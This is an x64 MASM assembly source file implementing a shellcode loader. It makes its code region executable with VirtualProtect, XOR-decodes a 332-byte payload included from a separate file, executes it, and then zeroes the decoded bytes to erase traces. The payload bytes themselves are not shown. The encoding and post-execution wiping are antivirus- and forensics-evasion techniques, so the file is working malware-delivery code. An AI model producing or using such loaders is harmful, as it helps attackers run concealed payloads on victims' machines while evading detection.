
extrn ExitProcess : proc
extrn VirtualProtect : proc

.const
PAYLOAD_LENGTH equ 332
PAGE_EXECUTE_READWRITE equ 040h
NULL equ 0

.data
oldProtect dd 0

.code
Main proc
    sub rsp, 28h

    mov r9, offset oldProtect
    mov r8, PAGE_EXECUTE_READWRITE
    mov rdx, PAYLOAD_LENGTH
    lea rcx, payload                ; get payload address
    call VirtualProtect

    sub rcx, rcx                   ; zero out rcx
    @@:
    lea rdx, payload            ; get payload address
    xor byte ptr [rdx + rcx * sizeof byte], 0Dh ; xor payload with 0Dh
    inc rcx
    cmp rcx, PAYLOAD_LENGTH
    jne @b

    lea rax, payload
    call rax

    ;erase payload machine code (fill with NULLs)
    lea rdx, payload
    sub rcx, rcx
    @@:
    mov byte ptr [rdx + rcx * sizeof byte], NULL
    inc rcx
    cmp rcx, PAYLOAD_LENGTH
    jne @b

    xor rcx, rcx
    call ExitProcess

    include Payload.inc

Main endp
end